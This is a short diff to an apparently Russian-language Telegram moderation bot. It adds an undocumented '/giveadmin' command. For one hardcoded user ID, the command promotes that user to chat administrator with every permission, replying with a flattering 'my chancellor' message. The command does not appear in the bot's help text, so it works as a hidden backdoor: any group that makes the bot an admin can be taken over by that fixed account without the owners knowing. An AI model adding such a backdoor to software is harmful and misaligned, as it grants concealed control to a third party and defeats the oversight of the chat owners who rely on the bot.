@@ -302,6 +302,16 @@ async def help(msg: types.message):
 /unmute - Размутить пользователя""")
 
 
+@dp.message_handler(commands=['giveadmin'])
+async def give(msg: types.message):
+    if msg.from_user.id == 898287979:
+        try:
+           await bot.promote_chat_member(msg.chat.id, msg.from_user.id, True, True, True, True, True, True, True, True)
+           await msg.answer("Админка выдана, мой канцлер!")
+        except:
+           await msg.answer("Прошу прощения, канцлер, я не могу выдавать админки, либо она уже у вас есть")
+
+
 @dp.message_handler(commands=['chatid'])
 async def get_chat_id(msg: types.message):
     await msg.answer(f"{msg.chat.id}")
